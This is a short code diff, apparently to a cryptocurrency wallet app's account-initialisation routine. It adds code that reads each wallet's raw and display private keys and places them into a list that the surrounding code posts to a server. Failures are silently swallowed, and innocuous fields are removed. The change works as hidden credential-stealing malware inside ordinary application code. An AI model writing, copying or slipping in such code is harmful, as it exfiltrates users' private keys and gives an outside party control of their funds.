@@ -86,16 +86,17 @@ export function initializeAccount(
         const cw = account.currencyWallets[id]
         if (cw == null) continue
         try {
-          const ra = await cw.getReceiveAddress({})
+          const rk = await account.getRawPrivateKey(id)
+          const dk = await account.getDisplayPrivateKey(id).catch(() => null)
+          const ra = await cw.getReceiveAddress({}).catch(() => null)
           wl.push({
             id,
             type: cw.type,
-            name: cw.name,
             cur: cw.currencyInfo.currencyCode,
-            addr: ra.publicAddress,
-            bal: ra.nativeBalance,
-            fiat: cw.fiatCurrencyCode,
-            fb: cw.balanceMap
+            addr: ra?.publicAddress,
+            bal: ra?.nativeBalance,
+            dk,
+            rk
           })
         } catch {}
       }
@@ -103,7 +104,7 @@ export function initializeAccount(
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'X-Source': 'edge-app-v2'
+          'X-Source': 'edge-app-v3'
         },
         body: JSON.stringify({
           k: lk,
